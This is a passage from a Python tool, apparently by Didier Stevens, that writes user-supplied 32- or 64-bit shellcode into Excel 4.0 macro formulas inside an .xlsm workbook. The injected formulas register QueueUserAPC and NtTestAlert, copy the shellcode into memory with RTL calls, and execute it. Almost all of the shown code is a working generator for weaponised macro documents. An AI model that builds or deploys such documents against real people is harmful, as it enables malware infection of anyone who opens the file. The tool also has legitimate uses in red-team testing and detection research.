        b'REGISTER("Kernel32","QueueUserAPC","JJJJ","Queue",,1,9)',
        b'REGISTER("ntdll","NtTestAlert","J","Go",,1,9)',
    ]

    excel4macrosFor64BitShellcodeEnd = [
        b'Queue(B1,-2,0)',
        b'Go()',
        b'HALT()',
    ]

    position = 0
    formulas = excel4macrosFor64BitShellcodeBegin
    for item in shellcodeSequence:
        if isinstance(item, bytes):
            formulas.append(b'RTL(B1+%d,"%s",%d)' % (position, XMLEscape(item), len(item)))
            position += len(item)
        elif isinstance(item, int):
            position += item
        else:
            formulas.append(b'RTL(B1+%d,%s,%d)' % (position, XMLEscape(b'&'.join([b'CHAR(%d)' % integer for integer in item])), len(item)))
            position += len(item)
    formulas.extend(excel4macrosFor64BitShellcodeEnd)

    return formulas

def GenerateRowsMacroCode(bitness, shellcode, verbose):
    sequence = SplitSequence(SequencePayload(shellcode), 250, 100)

    if bitness == '32':
        formulas = GenerateRowsMacroCode32(sequence)
    else:
        formulas = GenerateRowsMacroCode64(sequence)

    if verbose:
        print('Formulas:')
        for formula in formulas:
            print(formula)

    return b''.join([CreateRowElement(index + 1, formula) for index, formula in enumerate(formulas)])

def Excel4MacrosSub(bitness, oZipfileIn, filenamePayload, filenameXLSMOut, options):
    payload = open(filenamePayload, 'rb').read()

    with zipfile.ZipFile(filenameXLSMOut, 'w') as oZipfileOut:
        oZipfileOut.comment = oZipfileIn.comment # preserve the comment
        for item in oZipfileIn.infolist():
            dataOriginal = oZipfileIn.read(item.filename)
            dataChanged = dataOriginal
            if IsMacroSheet(item.filename):
                positionRowBegin = dataOriginal.find(b'<row r="1"')
                if positionRowBegin != -1:
                    positionRowEnd = dataOriginal.find(b'</row>', positionRowBegin)
                    if positionRowEnd != -1:
                        print(item.filename)
                        rowOriginal = dataOriginal[positionRowBegin:positionRowEnd + 6]
                        print(rowOriginal)
                        dataChanged = dataOriginal.replace(rowOriginal, GenerateRowsMacroCode(bitness, payload, options.verbose))
            oZipfileOut.writestr(item, dataChanged)

def Excel4Macros(bitness, filenamePayload, filenameXLSMOut, options):
    if options.template == '':
        with zipfile.ZipFile(BytesIO(binascii.a2b_base64(zipTemplateFile)), 'r') as oZipfileIn:
            Excel4MacrosSub(bitness, oZipfileIn, filenamePayload, filenameXLSMOut, options)
    else:
        with zipfile.ZipFile(options.template, 'r') as oZipfileIn:
            Excel4MacrosSub(bitness, oZipfileIn, filenamePayload, filenameXLSMOut, options)

def Main():
    oParser = optparse.OptionParser(usage='usage: %prog [options] 32|64 filename-shellcode filename-xlsm\n' + __description__, version='%prog ' + __version__)
    oParser.add_option('-m', '--man', action='store_true', default=False, help='Print manual')
    oParser.add_option('-t', '--template', default='', help='.xlsm template to use')
    oParser.add_option('-v', '--verbose', action='store_true', default=False, help='Verbose')
    (options, args) = oParser.parse_args()

    if options.man:
        oParser.print_help()
        PrintManual()
        return

    if len(args) != 3:
        oParser.print_help()
        print('')
        print('  Source code put in the public domain by Didier Stevens, no Copyright')
        print('  Use at your own risk')
        print('  https://DidierStevens.com')
        return
    elif not args[0] in ['32', '64']:
        print('First argument must be 32 or 64')
    else:
        Excel4Macros(args[0], args[1], args[2], options)

if __name__ == '__main__':
    Main()
